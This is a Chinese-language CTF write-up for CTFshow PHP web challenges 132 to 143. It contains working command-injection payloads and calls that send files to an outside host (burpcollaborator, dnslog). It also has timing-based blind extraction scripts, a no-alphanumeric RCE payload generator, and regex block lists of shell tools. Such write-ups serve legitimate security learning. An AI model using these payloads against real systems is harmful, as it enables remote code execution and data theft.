<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php<span class="comment">#error_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123;    $username = (String)$_GET[&#x27;username&#x27;];    $password = (String)$_GET[&#x27;password&#x27;];    $code = (String)$_GET[&#x27;code&#x27;];        if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123;                if($code == &#x27;admin&#x27;)&#123;            echo $flag;        &#125;            &#125;&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload?username=admin&amp;password=1&amp;code=admin</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/02/RX2Dwak1VZC8neG.png" alt="image-20210802121426804"></p>
<p><img src="https://i.loli.net/2021/08/02/wKxFbDq7QmNTdVX.png" alt="image-20210802121451767"></p>
<h2 id="1-34-Web-133-—-无回显命令执行"><a href="#1-34-Web-133-—-无回显命令执行" class="headerlink" title="1.34 Web 133 — 无回显命令执行"></a>1.34 Web 133 — 无回显命令执行</h2><p><a href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag.phpif(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;        <span class="built_in">eval</span>(substr(<span class="variable">$F</span>,0,6));    &#125;<span class="keyword">else</span>&#123;        die(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>分析</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">如果传入 ?F=` <span class="variable">$F</span>`;sleep 5则 substr(<span class="variable">$F</span>,0,6) 后得到 ` <span class="variable">$F</span>`;即执行 <span class="built_in">eval</span>(` <span class="variable">$F</span>`;);也就是 <span class="built_in">eval</span>(` ` <span class="variable">$F</span>`;sleep 5`;);而 `` 与 shell_exec() 一致则 <span class="built_in">eval</span>(shell_exec(<span class="string">&quot; ` <span class="variable">$F</span>`;sleep 5&quot;</span>));测试后 真的 执行了 sleep 5</span><br></pre></td></tr></table></figure>

<p>题目转换成：<strong>无回显的命令执行</strong></p>
<ul>
<li><p><strong>法一</strong></p>
<p><img src="https://i.loli.net/2021/08/02/qmGe4jI7o8gZtbd.png" alt="image-20210802123812745"></p>
<p><img src="https://i.loli.net/2021/08/02/oTXGpwmtyYqZ3rQ.png" alt="image-20210802123843178"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?F=`<span class="variable">$F</span>`;curl -X POST -F xx=@flag.php http://66ahgg5hlpg29qz2ehu6mn5hh8n1bq.burpcollaborator.net?F=`<span class="variable">$F</span>`;+curl -X POST -d<span class="string">&quot;flag=`cat flag.php`&quot;</span> ewe2mcnzf0hwu1l4eepxt26nwe25qu.burpcollaborator.net</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="https://i.loli.net/2021/10/01/kigqxcs5PmtvYQa.png" alt="image-20210810150448303"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload?F=`$F `;ping `ls | grep flag`.zdvlix.dnslog.cn -c 1?F=`$F `;ping `cat flag.php | grep flag`.zdvlix.dnslog.cn -c 1</span></span><br></pre></td></tr></table></figure>

<h2 id="1-35-Web-134-—-POST-数组覆盖"><a href="#1-35-Web-134-—-POST-数组覆盖" class="headerlink" title="1.35 Web 134 — _POST 数组覆盖"></a>1.35 Web 134 — _POST 数组覆盖</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="variable">$key1</span> = 0;<span class="variable">$key2</span> = 0;<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || isset(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || isset(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || isset(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;    die(<span class="string">&quot;nonononono&quot;</span>);&#125;@parse_str(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);extract(<span class="variable">$_POST</span>);<span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;    die(file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>));&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 测试&lt;?phpparse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);var_dump($_POST);# 传参 ?_POST[a]=123</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/08/amteA8lZkHP7svn.png" alt="image-20210808121554476"></p>
<p><img src="https://i.loli.net/2021/08/02/HYKx5rCNQElveW3.png" alt="image-20210802133330796"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload?_POST[key1]=36d&amp;_POST[key2]=36d</span></span><br></pre></td></tr></table></figure>

<h2 id="1-36-Web-135-—-无回显命令执行-—-写文件-cp-nl"><a href="#1-36-Web-135-—-无回显命令执行-—-写文件-cp-nl" class="headerlink" title="1.36 Web 135 — 无回显命令执行 — 写文件 cp   nl"></a>1.36 Web 135 — 无回显命令执行 — 写文件 cp   nl</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">web133plus</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag.phpif(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;        <span class="built_in">eval</span>(substr(<span class="variable">$F</span>,0,6));    &#125;<span class="keyword">else</span>&#123;        die(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload?F=`$F`; cp flag.php 1.txt# 然后访问 1.txt 即可?F=`$F `;nl f*&gt;2.txt</span></span><br></pre></td></tr></table></figure>

<h2 id="1-37-Web-136-—-无回显命令执行-—-ls-tee-xxx"><a href="#1-37-Web-136-—-无回显命令执行-—-ls-tee-xxx" class="headerlink" title="1.37 Web 136 — 无回显命令执行 — ls|tee xxx"></a>1.37 Web 136 — 无回显命令执行 — ls|tee xxx</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);<span class="keyword">function</span> check(<span class="variable">$x</span>)&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;        die(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);    &#125;&#125;<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    check(<span class="variable">$c</span>);    <span class="built_in">exec</span>(<span class="variable">$c</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/02/Z7J62hxmCTvAteF.png" alt="image-20210802141126957"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?c=ls|tee xxx</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tee 命令  https://linux.cn/article-9435-1.htmlping www.baidu.com | tee 1.txt将正在执行命令的输出内容 写入 指定文件当中# 追加写入ping www.baidu.com | tee -a 1.txt# 写入多个文件当中ping www.baidu.com | tee 1.txt 2.txt 3.txtls | tee  2.txt 3.txt 4.txt # 让 tee 命令的输出内容直接作为另一个命令的输入内容 root@kali:/var/www/html/learn# ls *.txt | tee 5.txt | wc -l4</span></span><br></pre></td></tr></table></figure>

<p>参考  <a href="https://linux.cn/article-9435-1.html">https://linux.cn/article-9435-1.html</a></p>
<p><img src="https://i.loli.net/2021/08/02/KYJ9kCDABHOGc6i.png" alt="image-20210802141608591"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?c=ls|tee xxx		<span class="comment"># 后访问 /xxx 将文件下载下来 得到当前目录之下 仅仅有 index.php</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/2pMsh8HFcSCoezb.png" alt="image-20210802142340473"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?c=ls /|tee 111</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/02/pdDAr1YcaRwMWsI.png" alt="image-20210802142541986"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?c=cat /f149_15_h3r3|tee 222</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/02/l87FYHj2x4WBC13.png" alt="image-20210802142703282"></p>
<h2 id="1-38-Web-137-—-call-user-func-传递-字符串-—-类名-函数名"><a href="#1-38-Web-137-—-call-user-func-传递-字符串-—-类名-函数名" class="headerlink" title="1.38 Web 137 — call_user_func() 传递 字符串 — 类名::函数名"></a>1.38 Web 137 — call_user_func() 传递 字符串 — 类名::函数名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123;    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;        die(<span class="string">&quot;private class&quot;</span>);    &#125;    static <span class="keyword">function</span> <span class="function"><span class="title">getFlag</span></span>()&#123;        <span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);    &#125;&#125;call_user_func(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payloadctfshow=ctfshow::getFlagctfshow=ctfshow-&gt;getFlag	#不可行</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>php中 -&gt;与:: 调用类中的成员的区别</strong><br><strong>-&gt;    用于动态语境处理某个类的某个实例</strong><br><strong>::    可以调用一个静态的、不依赖于其他初始化的类方法.</strong></p>
<p>也就是说双冒号可以不用实例化类就可以直接调用类中的方法</p>
</blockquote>
<h2 id="1-39-Web-138-—-call-user-func-传递-数组-—-不使用"><a href="#1-39-Web-138-—-call-user-func-传递-数组-—-不使用" class="headerlink" title="1.39 Web 138 — call_user_func() 传递 数组 — 不使用 ::"></a>1.39 Web 138 — call_user_func() 传递 数组 — 不使用 ::</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123;    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;        die(<span class="string">&quot;private class&quot;</span>);    &#125;    static <span class="keyword">function</span> <span class="function"><span class="title">getFlag</span></span>()&#123;        <span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);    &#125;&#125;<span class="keyword">if</span>(strripos(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-1)&#123;    die(<span class="string">&quot;private function&quot;</span>);&#125;call_user_func(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/02/G7B1UmwbYlqMVar.png" alt="image-20210802143748059"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 函数传参&lt;?phpfunction barber($type)&#123;    echo &quot;You wanted a $type haircut, no problem\n&quot;;&#125;call_user_func(&#x27;barber&#x27;, &quot;mushroom&quot;);call_user_func(&#x27;barber&#x27;, &quot;shave&quot;);?&gt; //You wanted a mushroom haircut, no problem//You wanted a shave haircut, no problem# 类传方法&lt;?phpclass myclass &#123;    static function say_hello()    &#123;        echo &quot;Hello!\n&quot;;    &#125;&#125;$classname = &quot;myclass&quot;;call_user_func(array($classname, &#x27;say_hello&#x27;));call_user_func($classname .&#x27;::say_hello&#x27;); // As of 5.2.3$myobject = new myclass();call_user_func(array($myobject, &#x27;say_hello&#x27;));?&gt; </span></span><br></pre></td></tr></table></figure>

<h2 id="1-40-Web-139-—-无回显命令注入-—-awk、cut-盲注"><a href="#1-40-Web-139-—-无回显命令注入-—-awk、cut-盲注" class="headerlink" title="1.40 Web 139 — 无回显命令注入 — awk、cut 盲注"></a>1.40 Web 139 — 无回显命令注入 — awk、cut 盲注</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);<span class="keyword">function</span> check(<span class="variable">$x</span>)&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;        die(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);    &#125;&#125;<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    check(<span class="variable">$c</span>);    <span class="built_in">exec</span>(<span class="variable">$c</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>awk  cut  盲注 命令：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/桌面/111<span class="comment"># vi flag.phproot@kali:~/桌面/111# cat flag.php test1test2test3flag&#123;qwertyui&#125;root@kali:~/桌面/111# cat flag.php | awk NR==1test1root@kali:~/桌面/111# cat flag.php | awk NR==2test2root@kali:~/桌面/111# cat flag.php | awk NR==3test3root@kali:~/桌面/111# cat flag.php | awk NR==4flag&#123;qwertyui&#125;root@kali:~/桌面/111# cat flag.php | awk nr==4root@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 1froot@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 2lroot@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 3aroot@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 4groot@kali:~/桌面/111# if [ $(cat flag.php|awk NR==1|cut -c 2)==l ];then echo success;fi                                                             success                                                                   root@kali:~/桌面/111# if [ $(cat flag.php|awk NR==1|cut -c 2)==l ];then sleep 2;fi</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/05/iMTXdeNtrVFQKcW.png" alt="image-20210805153710357"></p>
<p><strong>脚本：查找根目录的内容</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requestsimport timeimport string<span class="comment">#str=string.ascii_letters+string.digitsstr = &#x27;abcdefghigklmnopqrstuvwxyz_&#123;&#125;0123456789 &#x27;result=&quot;&quot;for i in range(1,10):	key=0	for j in range(1,50):		if key==1:			break		#for n in range(32,128):		for n in str:			#n=chr(n)			#payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)			payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)			#print(payload)			url=&quot;http://4b941830-8b3f-49bd-8aa8-0d35e2d2d486.challenge.ctf.show:8080?c=&quot;+payload			try:				requests.get(url,timeout=(2.5,2.5))			except:			    result=result+n			    print(result)			    break			if n==&#x27;9&#x27;:				key=1	result+=&quot; &quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>脚本：查 flag</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requestsimport timeimport string<span class="comment">#str=string.ascii_letters+string.digitsstr = &#x27;abcdefghigklmnopqrstuvwxyz_&#123;&#125;0123456789 &#x27;result=&quot;&quot;for i in range(1,10):	key=0	for j in range(1,50):		if key==1:			break		#for n in range(32,128):		for n in str:			#n=chr(n)			payload=&quot;if [ `cat /f149_15_h3r3|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)			#payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)			#print(payload)			url=&quot;http://4b941830-8b3f-49bd-8aa8-0d35e2d2d486.challenge.ctf.show:8080?c=&quot;+payload			try:				requests.get(url,timeout=(2.5,2.5))			except:			    result=result+n			    print(result)			    break			if n==&#x27;9&#x27;:				key=1	result+=&quot; &quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requestscmd = <span class="string">&#x27;cat /f149_15_h3r3&#x27;</span>result = <span class="string">&#x27;&#x27;</span><span class="keyword">for</span> i <span class="keyword">in</span> range(1, 10):    <span class="keyword">for</span> j <span class="keyword">in</span> range(1, 50):        <span class="built_in">print</span>(<span class="string">&#x27;i=&#x27;</span>, i, <span class="string">&#x27; j=&#x27;</span>, j)        <span class="keyword">for</span> k <span class="keyword">in</span> range(32, 128):            k = chr(k)            payload = f<span class="string">&quot;if [ `&#123;cmd&#125; |awk NR==&#123;i&#125;|cut -c &#123;j&#125;` == &#123;k&#125; ]; then sleep 3;fi&quot;</span>            payload = <span class="string">&#x27;?c=&#x27;</span> + payload            url = <span class="string">&#x27;http://4b941830-8b3f-49bd-8aa8-0d35e2d2d486.challenge.ctf.show:8080&#x27;</span>            try:                requests.get(url + payload, timeout=(2.5, 2.5))            except:                result = result + k                <span class="built_in">print</span>(result)                <span class="built_in">break</span>    result = result + <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="1-41-Web-140-—-intval-code-‘ctfshow’-—-code-eval-“return-f1-f2-”"><a href="#1-41-Web-140-—-intval-code-‘ctfshow’-—-code-eval-“return-f1-f2-”" class="headerlink" title="1.41 Web 140 — intval($code) == ‘ctfshow’ — $code = eval(“return $f1($f2());”);"></a>1.41 Web 140 — intval($code) == ‘ctfshow’ — $code = eval(“return $f1($f2());”);</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;    <span class="variable">$f1</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];    <span class="variable">$f2</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;            <span class="variable">$code</span> = <span class="built_in">eval</span>(<span class="string">&quot;return <span class="variable">$f1</span>(<span class="variable">$f2</span>());&quot;</span>);            <span class="keyword">if</span>(intval(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;                <span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);            &#125;        &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>我们的目的是 ，而且只能使用 字母和数字进行构造</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="built_in">eval</span>(<span class="string">&quot;return <span class="variable">$f1</span>(<span class="variable">$f2</span>());&quot;</span>);<span class="keyword">if</span>(intval(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;      <span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);&#125;<span class="comment"># intval() == 弱类型比较，只要让 # $code 为 0 | False | NULL  即可 # 准确的来说，只要不是数字即可</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payloadmd5(phpinfo())	#c4ca4238a0b923820dcc509a6f75849b	#1md5(sleep())	#d41d8cd98f00b204e9800998ecf8427e	#空密码md5(md5())		#d41d8cd98f00b204e9800998ecf8427e	#空密码current(localeconv)sha1(getcwd())#md5(getcwd()) 不可行 #247369500707596003b38cd5879122f6f1=intval&amp;f2=intval	# 0f1=usleep&amp;f2=usleep</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/05/3nXbdCi6fSDqg1p.png" alt="image-20210805161637530"></p>
<h2 id="1-42-Web-141-—-eval-“return-v1-v3-v2-”"><a href="#1-42-Web-141-—-eval-“return-v1-v3-v2-”" class="headerlink" title="1.42 Web 141 — eval(“return $v1$v3$v2;”);"></a>1.42 Web 141 — eval(“return $v1$v3$v2;”);</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php<span class="comment">#error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    $v2 = (String)$_GET[&#x27;v2&#x27;];    $v3 = (String)$_GET[&#x27;v3&#x27;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#x27;/^\W+$/&#x27;, $v3))&#123;        # v3 不能是 字母、数字、下划线            $code =  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 = &quot;.$code;        &#125;    &#125;&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>\w</strong>      #匹配字母、数字、下划线。等价于 [A-Za-z0-9_] </p>
</blockquote>
<p><strong>测试：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>highlight_file(<span class="keyword">__FILE__</span>);<span class="comment"># $code =  eval(&quot;return $v1$v3$v2;&quot;);// eval(&quot;return 1;phpinfo();&quot;);	#不可行// eval(&quot;return 0;phpinfo();&quot;);	#不可行// eval(&quot;return 1-phpinfo();&quot;);	#可行eval(&quot;return 1+phpinfo();&quot;);	#可行eval(&quot;return 2+phpinfo();&quot;);	#可行?&gt;    # 也就是说，数字可以与命令进行运算</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>由于 v1 v2 也只能是 数字，那么我们可以构造 <code>1+phpinfo()+1</code> 等式子</p>
</li>
<li><p>v3 不能是 字母、数字、下划线，那么现在如何构造 v3?</p>
<p>无字母、数字 RCE</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/桌面/脚本<span class="comment"># python re.py输出执行函数:&#x27;system&#x27;请输出函数参数:&#x27;tac f*&#x27;(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;)</span></span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload?v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# *?v1=1&amp;v3=-(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# -?v1=1&amp;v3=%2b(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# 尝试过后 不能直接用+ 要进行 URL 编码#+?v1=1&amp;v3=^(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# ^?v1=1&amp;v3=%26(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# &amp; %26?v1=1&amp;v3=%2f(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# / 这次竟然 火绒没有拦截</span></span><br></pre></td></tr></table></figure>

<p>也就是说，加减乘除，取反、异或，都可能</p>
<p><strong>| 拼接 无字母数字脚本</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-# @Time : 20.12.4 23:05# @author:lonmarimport recontent = &#x27;&#x27;preg = &#x27;[a-z]|[0-9]&#x27; # 题目过滤正则# 生成字典for i in range(256):    for j in range(256):        if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):            k = i | j            if 32 &lt;= k &lt;= 126:                a = &#x27;%&#x27; + hex(i)[2:].zfill(2)                b = &#x27;%&#x27; + hex(j)[2:].zfill(2)                content += (chr(k) + &#x27; &#x27; + a + &#x27; &#x27; + b + &#x27;\n&#x27;)f = open(&#x27;rce_or.txt&#x27;, &#x27;w&#x27;)f.write(content)while True:    payload1 = &#x27;&#x27;    payload2 = &#x27;&#x27;    code = input(&quot;data:&quot;)    for i in code:        f = open(&#x27;rce_or.txt&#x27;)        lines = f.readlines()        for line in lines:            if i == line[0]:                payload1 = payload1 + line[2:5]                payload2 = payload2 + line[6:9]                break    payload = &#x27;(&quot;&#x27;+payload1+&#x27;&quot;|&quot;&#x27;+payload2+&#x27;&quot;)&#x27;    print(&quot;payload: &quot;+ payload)</span></span><br></pre></td></tr></table></figure>



<h2 id="1-43-Web-142-—-d-int-v1-0x36d-0x36d-0x36d-0x36d-0x36d"><a href="#1-43-Web-142-—-d-int-v1-0x36d-0x36d-0x36d-0x36d-0x36d" class="headerlink" title="1.43 Web 142 — $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);"></a>1.43 Web 142 — $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>))&#123;        <span class="variable">$d</span> = (int)(<span class="variable">$v1</span> * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);        sleep(<span class="variable">$d</span>);        <span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?v1=0</span><br></pre></td></tr></table></figure>

<h2 id="1-44-Web-143-—-141-plus"><a href="#1-44-Web-143-—-141-plus" class="headerlink" title="1.44 Web 143 — 141 plus"></a>1.44 Web 143 — 141 plus</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">141的plus版本</span><br></pre></td></tr></table></figure>

